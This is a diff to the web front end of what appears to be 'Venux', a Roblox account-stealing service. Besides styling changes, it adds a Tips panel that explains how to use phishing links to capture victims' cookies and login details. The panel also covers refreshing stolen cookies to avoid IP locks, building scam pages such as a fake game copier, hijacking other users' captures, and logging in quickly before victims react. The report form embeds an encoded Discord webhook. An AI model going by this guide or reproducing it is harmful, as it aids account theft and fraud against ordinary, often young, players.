@@ -120,7 +120,7 @@
     #theme-toggle {
       position: fixed;
       top: 20px;
-      right: 80px;
+      right: 140px;
       width: 50px;
       height: 50px;
       background: #111;
@@ -151,7 +151,6 @@
       stroke: #000;
     }
 
-    /* Hover: Invert icon and background, same as report button */
     #theme-toggle:hover {
       background: #fff;
       border-color: #fff;
@@ -159,7 +158,7 @@
     }
 
     #theme-toggle:hover svg {
-      stroke: #000; /* Invert to black when background becomes white */
+      stroke: #000;
     }
 
     body.light-mode #theme-toggle:hover {
@@ -169,7 +168,45 @@
     }
 
     body.light-mode #theme-toggle:hover svg {
-      stroke: #fff; /* Invert to white when background becomes black */
+      stroke: #fff;
+    }
+
+    /* Tips Button */
+    #tips-button {
+      position: fixed;
+      top: 20px;
+      right: 80px;
+      width: 50px;
+      height: 50px;
+      background: #111;
+      border: 2px solid #ddd;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      z-index: 2;
+      transition: all 0.3s ease;
+      color: #fff;
+      font-size: 1.3em;
+    }
+
+    body.light-mode #tips-button {
+      background: #f1f1f1;
+      border-color: #aaa;
+      color: #000;
+    }
+
+    #tips-button:hover {
+      background: #fff;
+      color: #000;
+      box-shadow: 0 0 12px #fff;
+    }
+
+    body.light-mode #tips-button:hover {
+      background: #000;
+      color: #fff;
+      box-shadow: 0 0 12px #000;
     }
 
     /* Report Button */
@@ -352,6 +389,101 @@
       box-shadow: 0 0 15px #000;
     }
 
+    /* Tips UI */
+    #tips-ui {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0.7);
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
+      background: #111;
+      border: 2px solid #ddd;
+      border-radius: 16px;
+      padding: 25px;
+      z-index: 3;
+      min-width: 320px;
+      max-width: 500px;
+      color: #fff;
+      box-shadow: 0 0 20px rgba(255,255,255,0.3);
+    }
+
+    body.light-mode #tips-ui {
+      background: #f1f1f1;
+      border-color: #aaa;
+      color: #000;
+    }
+
+    #tips-ui.show {
+      transform: translate(-50%, -50%) scale(1);
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .tip-section {
+      margin-bottom: 16px;
+      border-bottom: 1px solid #333;
+      padding-bottom: 12px;
+    }
+
+    body.light-mode .tip-section {
+      border-bottom: 1px solid #ccc;
+    }
+
+    .tip-title {
+      font-size: 1.2em;
+      font-weight: bold;
+      margin: 0 0 8px 0;
+      cursor: pointer;
+      color: #fff;
+      transition: color 0.2s ease;
+    }
+
+    body.light-mode .tip-title {
+      color: #000;
+    }
+
+    .tip-title:hover {
+      color: #00d0ff;
+    }
+
+    .tip-content {
+      display: none;
+      margin-top: 8px;
+      font-size: 0.9em;
+      color: #ccc;
+      line-height: 1.5;
+    }
+
+    body.light-mode .tip-content {
+      color: #555;
+    }
+
+    .tip-content.show {
+      display: block;
+    }
+
+    .discord-help-btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      background: #5865F2;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-family: 'Orbitron', sans-serif;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .discord-help-btn:hover {
+      background: #4752c4;
+      box-shadow: 0 0 10px #4752c4;
+    }
+
     #notification {
       position: fixed;
       top: 80px;
@@ -495,13 +627,16 @@
       <button id="refresh-count">⟳</button>
     </div>
 
-    <!-- Theme Toggle Button -->
+    <!-- Theme Toggle -->
     <div id="theme-toggle">
       <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
         <circle cx="12" cy="12" r="5" />
         <path d="M12 2v2M12 20v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M2 12h2M20 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42" />
       </svg>
     </div>
+
+    <!-- Tips Button -->
+    <div id="tips-button">💡</div>
 
     <!-- Report Button -->
     <div id="report-button">
@@ -510,6 +645,7 @@
       </svg>
     </div>
 
+    <!-- Report UI -->
     <div id="report-ui">
       <h2>Report</h2>
       <p>Must be in the Discord server to get your response</p>
@@ -527,6 +663,52 @@
       <p class="attach-note">Optional / Max 10 attachments</p>
       <div class="file-list" id="file-list"></div>
       <button id="submit-report">Submit Report</button>
+    </div>
+
+    <!-- Tips UI -->
+    <div id="tips-ui">
+      <h2>Tips & Help</h2>
+      <div class="tip-section">
+        <div class="tip-title" onclick="toggleTip('generator')">Generator</div>
+        <div class="tip-content" id="generator">
+          What does our generator do? When you open our generator it opens our website and it directs you to a dashboard that shows all the accounts you've beamed. When you go to settings thats where you can make ur profile link, server link, or Group link. After someone has logged in with your link you get there cookie, login details, and it displays how old, how much robux, and more. Watch the tutorials to start beaming with Venux!<br><br>
+          <strong>✨ Features:</strong> Auto link creation, Profile link, Server link, Group link, and even auto secures the account if you toggled the setting.
+        </div>
+      </div>
+
+      <div class="tip-section">
+        <div class="tip-title" onclick="toggleTip('refresher')">Cookie Refresher</div>
+        <div class="tip-content" id="refresher">
+          What does refresher do? Our refresher lets you refresh the victims cookie so you can prevent ip lock and get into there account. Also when you refresh the cookie it helps u secure the account easier with our bypasser in our discord server. Join our discord to recieve support or to get assistance.<br><br>
+          <strong>🔄 Features:</strong> Refreshes cookie to prevent ip lock and helps you fully secure the account using our bypasser in our discord server.
+        </div>
+      </div>
+
+      <div class="tip-section">
+        <div class="tip-title" onclick="toggleTip('autohar')">AutoHar</div>
+        <div class="tip-content" id="autohar">
+          What does our AutoHar do? Autohar is a method to beam someone. You will have many methods like game copier — you have to convince your victim that this tool copies games for you, and when they follow the steps, you get their info.<br><br>
+          <strong>🚗 Features:</strong> Create a scam page for you like fake voice chat enabler. It also has triplehook if you want to steal beams from others.
+        </div>
+      </div>
+
+      <div class="tip-section">
+        <div class="tip-title" onclick="toggleTip('protips')">Pro Tips</div>
+        <div class="tip-content" id="protips">
+          • When creating links, always use a hyperlink/shortener to prevent limits on accounts.<br>
+          • When beaming, use the refresher to prevent getting IP locked.<br>
+          • Act fast after getting a beam — log in quickly so they don't change their credentials.<br>
+          • Join our Discord for 24/7 support, free rewards from giveaways, and chatting within our community.
+        </div>
+      </div>
+
+      <div class="tip-section">
+        <div class="tip-title" onclick="toggleTip('morehelp')">More Help</div>
+        <div class="tip-content" id="morehelp">
+          Need help with anything? Join our Discord community for instant support, tools, and updates.<br><br>
+          <a href="https://discord.gg/PV3vVfc7s7" target="_blank" class="discord-help-btn">Join Discord</a>
+        </div>
+      </div>
     </div>
 
     <div id="notification"></div>
@@ -636,6 +818,29 @@
       body.classList.toggle('light-mode');
       localStorage.setItem('theme', body.classList.contains('light-mode') ? 'light' : 'dark');
     });
+
+    // Tips Button
+    const tipsButton = document.getElementById('tips-button');
+    const tipsUI = document.getElementById('tips-ui');
+
+    tipsButton.addEventListener('click', () => {
+      tipsUI.classList.toggle('show');
+    });
+
+    // Close tips UI when clicking outside
+    document.addEventListener('click', (event) => {
+      if (!tipsUI.contains(event.target) && !tipsButton.contains(event.target) && tipsUI.classList.contains('show')) {
+        tipsUI.classList.remove('show');
+      }
+    });
+
+    // Expandable Tips
+    function toggleTip(id) {
+      const content = document.getElementById(id);
+      const all = document.querySelectorAll('.tip-content');
+      all.forEach(el => { if (el.id !== id) el.classList.remove('show'); });
+      content.classList.toggle('show');
+    }
 
     // Report System
     const webhookEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMDUxMjQ0NTExMzU2NTM5NC9NUlhJei1oZExjN0wtLUc2S3JLUFUzQzVqQ3R3d09CUjBSOHJSU3prMEJZM216dmxiVkR2SnFxamFjUlRrOGZ2UzE2Zw==';
